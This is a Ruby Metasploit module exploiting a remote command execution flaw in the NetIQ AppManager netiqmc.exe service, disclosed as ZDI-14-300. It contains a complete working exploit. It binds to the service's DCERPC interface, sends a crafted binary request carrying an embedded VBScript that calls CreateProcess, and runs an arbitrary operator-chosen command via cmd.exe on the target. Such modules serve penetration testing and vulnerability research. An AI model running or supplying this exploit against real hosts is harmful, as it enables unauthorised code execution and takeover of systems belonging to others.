require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,	
      'Name'           => 'NetIQ AppManager Client Resource Monitor Remote Command Execution',
      'Description'    => %q{
	 This module abuses the netiqmc.exe service by supplying a  specially crafted script. 
         When binding to the uuid of '06ff3d30-d022-11d2-aea5-00600826a195' and passing the script
	 to opcode '00', an attacker may run arbitrary system commands as the privileges of the 
         running process.
      },
			
     'Author'         => [ 'Mario Ceballos' ],
     'License'        => 'BSD_LICENSE',
     'References'     => [[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-300/' ],],
     'DisclosureDate' => 'Sep 3 2014'))
      register_options(
        [
          OptString.new('CMD', [ true, 'The command to execute', 'notepad']),
          Opt::RPORT(9998),
        ], self.class)
		
   end
			
  def run

     connect()

     handle = dcerpc_handle('06ff3d30-d022-11d2-aea5-00600826a195', '4.0', 'ncacn_ip_tcp', [datastore['RPORT']])
     print_status("Binding to #{handle} ...")

     cmd = datastore['CMD']

     hname = Rex::Text.rand_text_alpha_upper(6)
     hnamedomain = Rex::Text.rand_text_alpha_upper(22)
     scriptname = Rex::Text.rand_text_alpha_upper(11)

     schedule = %Q|<Schedule>\r
  <Default type="runonce" runmode="sched"></Default>\r
  <Allowed>\r
    <RunOnce>1</RunOnce>\r
    <IntervalIter>1</IntervalIter>\r
    <Daily>1</Daily>\r
    <Weekly>1</Weekly>\r
    <Monthly>1</Monthly>\r
  </Allowed>\r
</Schedule>|

     ver = %Q|'### Begin KP-Version Section\r
Const AppManID = "6.0.0.0"\r
Const KSVerID = "1.2"\r
'### End KP-Version Section\r\n\r|

     ver2 = %Q|'### Begin Type Section\r
Const NT_MachineFolder = "TEST2K3"\r
'### End Type Section\r\n|
     ver3 = %Q|'### Begin KPV Section\r
Sub KS_INIT ()\r
End Sub\r\n

'### End KPV Section\r\n|

     ver4 = %Q|'### Begin KPP Section\r
Const CMD="cmd.exe /c & #{cmd}"\r
'### End KPP Section\r\n|

     ver4 << "\x00"

     remain = 4 - (ver4.size % 4)
     pad = ""
     if remain != 4
      while remain != 0 do
       pad << "\x00"
       remain -= 1
      end
     end

     vbs = %Q|Type PROCESS_INFO\r
hProcess As Long\r
hThread As Long\r
dwProcessId As Long\r
dwThreadId As Long\r
End Type\r
Type STARTUPINFO\r
cb As Long\r
lpReserved As String\r
lpDesktop As String\r
lpTitle As String\r
dwX As Long\r
dwY As Long\r
dwXSize As Long\r
dwYSize As Long\r
dwXCountChars As Long\r
dwYCountChars As Long\r
dwFillAttribute As Long\r
dwFlags As Long\r
wShowWindow As Integer\r
cbReserved2 As Integer\r
lpReserved2 As Long\r
hStdInput As Long\r
hStdOutput As Long\r
hStdError As Long\r
End Type\r
Declare Function CreateProcess Lib "kernel32" Alias _\r
"CreateProcessA" (Byval lpApplicationName As String, _\r
Byval lpCommandLine As String, _\r
Byval lpProcessAttributes As Any, _\r
Byval lpThreadAttributes As Any, _\r
Byval bInheritHandles As Long, _\r
Byval dwCreationFlags As Long, _\r
Byval lpEnvironment As Any, _\r
Byval lpCurrentDirectory As String, _\r
lpStartupInfo As STARTUPINFO, _\r
lpProcessInformation As PROCESS_INFO) As Boolean\r
Const Quo=""""\r
Sub Main()\r
Dim pInfo As PROCESS_INFO\r
Dim sInfo As STARTUPINFO\r
Dim sNull As String\r
Dim qcmd$\r
qcmd="cmd /c " & QUO & CMD & QUO\r
sInfo.dwFlags=&H1&\r
sInfo.wShowWindow=&H0&\r
sInfo.cb=Len(sInfo)\r
success=CreateProcess(sNull,(qcmd),0&,0&, _\r
0&,&H20&, _\r
0&,sNull,sInfo,pInfo)\r
End Sub\r
|

     action = "<ActionDef></ActionDef>"

     req =   "\x00\x00\x04\x00\x00\x00\x00\x00\x76\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x04\x00\x00\x00\x00\x00"
     req <<  "\x17\x00\x00\x00\x00\x00\x02\x00\x67\xe4\x0c\x52\x10\x00\x00\x00"
     req <<  "\x04\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x07\x00\x00\x00"
     req <<  "\x08\x00\x02\x00\x10\x00\x00\x00\x0c\x00\x02\x00\x0f\x27\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef\x00\x00\x00"
     req <<  "\x10\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x0c\x00\x00\x00"
     req <<  "\x14\x00\x02\x00\x00\x00\x00\x00\x01\x00\x00\x00\x2c\x00\x00\x00"
     req <<  "\x05\x00\x00\x00\x18\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00"
     req <<  "\x18\x00\x00\x00\x30\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x04\x00\xb0\x04\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
     req <<  "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  [hnamedomain.size + 1].pack('V') + hnamedomain
     req <<  "\x00\x00\x10\x00\x00\x00\x7e\x49\x3c\x61"
     req <<  "\x55\xb8\x46\x46\xa2\x2a\xdf\x93\x44\x5b\xeb\x2c"
     req <<  [hname.size + 1].pack('V') + hname
     req <<  "\x00\x00\x10\x00\x00\x00\x92\xbf\x96\x55"
     req <<  "\x44\x01\xa4\x4d\x85\xdb\xc5\x03\x5a\x77\x53\x32"
     req <<  [schedule.size + 1].pack('V') + schedule + "\x00\x00"
     req <<  [scriptname.size + 1].pack('V') + scriptname + "\x00"
     req <<  "\x05\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x72\x00\x00\x00"
     req <<  "\x1c\x00\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\x55\x00\x00\x00"
     req <<  "\x20\x00\x02\x00\x03\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00"
     req <<  "\x24\x00\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x45\x00\x00\x00"
     req <<  "\x28\x00\x02\x00\x05\x00\x00\x00\x00\x00\x00\x00"
     req <<  [vbs.size + 1].pack('V') + "\x2c\x00\x02\x00" + [ver.size + 1].pack('V')
     req <<  ver + "\x0a\x00\x0a\x0d" + [ver2.size + 1].pack('V')
     req <<  ver2 + "\x00\x6e\x0d\x0a" + [ver3.size + 1].pack('V')
     req <<  ver3 + "\x00\x6e\x0d" + [ver4.size + 1].pack('V')
     req <<  ver4 + pad + [vbs.size + 1].pack('V')
     req <<  vbs + "\x00" + [action.size].pack('V') + action
     req <<  "\x00\x00\x00\x04\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     req <<  "\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"

     begin
      dcerpc_bind(handle)
      print_status("Bound to #{handle} ...")
     rescue Rex::Proto::DCERPC::Exceptions::NoResponse
     end

     begin
      print_good "Running command '#{cmd}'"
      dcerpc_call(0x00, req)
     rescue Rex::Proto::DCERPC::Exceptions::NoResponse
     end

     disconnect
		
  end

end
__END__
netiqmc.exe 7.0.10160.0
